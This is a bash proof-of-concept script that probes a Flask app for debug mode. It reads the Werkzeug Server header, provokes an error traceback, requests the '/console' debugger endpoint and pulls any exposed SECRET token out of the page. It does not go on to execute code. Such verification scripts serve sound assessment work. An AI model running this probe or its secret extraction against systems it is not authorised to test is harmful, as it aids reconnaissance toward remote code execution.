#!/bin/bash

# POC: Flask Debug Mode Enabled in Production
# This script demonstrates that Flask is running with debug=True

TARGET_URL="${1:-http://localhost:5000}"

echo "[*] Flask Debug Mode Verification POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Check if the application responds to requests
echo "[*] Step 1: Checking if application is accessible..."
response=$(curl -s -I "$TARGET_URL" 2>/dev/null)
if [ -z "$response" ]; then
    echo "[-] Application not accessible at $TARGET_URL"
    exit 1
fi
echo "[+] Application is accessible"
echo ""

# Step 2: Check Server header for Werkzeug (indicates debug infrastructure)
echo "[*] Step 2: Checking Server header for debug indicators..."
server_header=$(curl -s -I "$TARGET_URL" | grep -i "^Server:" | head -1)
if echo "$server_header" | grep -iq "werkzeug"; then
    echo "[+] Werkzeug detected in Server header: $server_header"
    echo "[+] This indicates development server with debug capabilities"
else
    echo "[-] Werkzeug not detected in Server header"
fi
echo ""

# Step 3: Trigger an unhandled exception to expose the debugger
echo "[*] Step 3: Attempting to trigger unhandled exception..."
echo "[*] Accessing endpoint with invalid parameters to cause exception..."

# Try to access a route that will cause an error if debug mode is enabled
error_response=$(curl -s "$TARGET_URL/xss9" -d "invalid_post_data" 2>/dev/null)

# Check if the response contains Werkzeug debugger indicators
if echo "$error_response" | grep -iq "werkzeug"; then
    echo "[+] Werkzeug debugger output detected in response!"
    echo "[+] DEBUG MODE IS ENABLED - Debugger interface is accessible"
elif echo "$error_response" | grep -iq "traceback\|<html>"; then
    echo "[+] HTML response received - checking for debug indicators"
fi
echo ""

# Step 4: Check for debugger console endpoint
echo "[*] Step 4: Checking for Werkzeug debugger console endpoint..."
console_response=$(curl -s -w "\n%{http_code}" "$TARGET_URL/console" 2>/dev/null)
http_code=$(echo "$console_response" | tail -n 1)
console_body=$(echo "$console_response" | head -n -1)

if [ "$http_code" = "200" ]; then
    echo "[+] Debugger console is accessible (HTTP 200)"
    echo "[+] DEBUG MODE IS ENABLED"
    
    # Check for EVALEX indicators
    if echo "$console_body" | grep -iq "evalex\|EVALEX"; then
        echo "[+] Remote code execution via EVALEX is enabled!"
    fi
    
    # Check for SECRET token exposure
    if echo "$console_body" | grep -iq "SECRET"; then
        echo "[+] SECRET token exposed in console page source"
        secret_value=$(echo "$console_body" | grep -o "SECRET['\"][: ]*['\"][^'\"]*['\"]" | head -1)
        echo "[+] $secret_value"
    fi
else
    echo "[*] Console endpoint returned HTTP $http_code"
fi
echo ""

# Step 5: Summary
echo "[*] Step 5: Summary"
echo "=================================================="
if [ "$http_code" = "200" ]; then
    echo "[✓] CONFIRMED: Flask debug mode is ENABLED"
    echo "[✓] Vulnerability: Debugger console is publicly accessible"
    echo "[✓] Risk: Source code exposure, system information disclosure, potential RCE"
    echo "=================================================="
    exit 0
else
    echo "[?] Debug mode status unclear - console returned HTTP $http_code"
    echo "=================================================="
    exit 1
fi